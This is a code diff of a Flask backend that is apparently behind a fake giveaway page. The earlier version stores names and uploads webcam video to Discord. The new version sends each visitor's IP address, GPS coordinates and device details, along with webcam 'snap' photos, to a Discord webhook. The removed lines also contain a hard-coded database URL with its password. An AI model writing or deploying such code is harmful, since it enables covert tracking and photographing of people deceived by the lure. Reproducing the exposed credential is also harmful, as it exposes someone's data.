@@ -1,71 +1,75 @@
 from flask import Flask, request, jsonify, render_template
-import psycopg2
 from flask_cors import CORS
 import os
 import uuid
 import requests
+from datetime import datetime
+from dotenv import load_dotenv
+import logging
 
+load_dotenv()
 app = Flask(__name__)
 CORS(app)
 
-# PostgreSQL DB from Render
-DATABASE_URL = "postgresql://nottherealepic:4u4lbsU8YdqcCnVsc0DYewLlOiaMabha@dpg-d1n08omr433s73b5jkg0-a.singapore-postgres.render.com/epicgiveaway_nw6s"
+DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
+if not DISCORD_WEBHOOK:
+    raise RuntimeError("Missing DISCORD_WEBHOOK")
 
-# Connect to PostgreSQL
-conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-cursor = conn.cursor()
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# Create table if it doesn't exist
-cursor.execute('''
-CREATE TABLE IF NOT EXISTS names (
-    id SERIAL PRIMARY KEY,
-    username TEXT NOT NULL,
-    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-);
-''')
-conn.commit()
-
-# Serve HTML page
 @app.route('/')
-def index():
-    return render_template("index.html")
+def home():
+    return render_template('index.html')
 
-# API to save name to DB
-@app.route('/submit-name', methods=['POST'])
-def submit_name():
-    data = request.json
-    name = data.get('name', '').strip()
-    if not name:
-        return jsonify({'error': 'Name is required'}), 400
+@app.route('/log-initial', methods=['POST'])
+def log_initial():
+    try:
+        data = request.get_json()
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    cursor.execute("INSERT INTO names (username) VALUES (%s);", (name,))
-    conn.commit()
-    return jsonify({'message': 'Name saved successfully'}), 200
+        # Validate location data
+        lat = data.get('lat', 'Unknown')
+        lon = data.get('lon', 'Unknown')
 
-# Upload webcam recording to Discord via bot
-DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
-DISCORD_CHANNEL_ID = os.getenv("DISCORD_CHANNEL_ID")
+        message = {
+            "content": (
+                "📱 New Access\n"
+                f"🌐 IP: {ip}\n"
+                f"📍 Location: {lat}, {lon}\n"
+                f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                f"📱 Device: {request.user_agent}"
+            )
+        }
 
-@app.route('/upload-video', methods=['POST'])
-def upload_video():
-    video = request.files['video']
-    filename = f"{uuid.uuid4()}.webm"
+        requests.post(DISCORD_WEBHOOK, json=message)
+        return jsonify({"status": "success"}), 200
 
-    files = {'file': (filename, video, 'video/webm')}
-    headers = {
-        'Authorization': f'Bot {DISCORD_BOT_TOKEN}'
-    }
+    except Exception as e:
+        logger.error(f"Log error: {str(e)}")
+        return jsonify({"error": str(e)}), 500
 
-    r = requests.post(
-        f'https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages',
-        headers=headers,
-        files=files
-    )
+@app.route('/upload-photo', methods=['POST'])
+def upload_photo():
+    try:
+        if 'photo' not in request.files:
+            return jsonify({"error": "No photo"}), 400
 
-    if r.status_code in (200, 204):
-        return "Uploaded to Discord!", 200
-    else:
-        return f"Failed: {r.status_code} - {r.text}", 500
+        photo = request.files['photo']
+        filename = f"snap-{datetime.now().strftime('%Y%m%d-%H%M%S')}.jpg"
+
+        # Reset file stream position
+        photo.stream.seek(0)
+
+        files = {'file': (filename, photo.stream, 'image/jpeg')}
+        response = requests.post(DISCORD_WEBHOOK, files=files)
+        response.raise_for_status()
+
+        return jsonify({"status": "success"}), 200
+
+    except Exception as e:
+        logger.error(f"Upload error: {str(e)}")
+        return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=True)
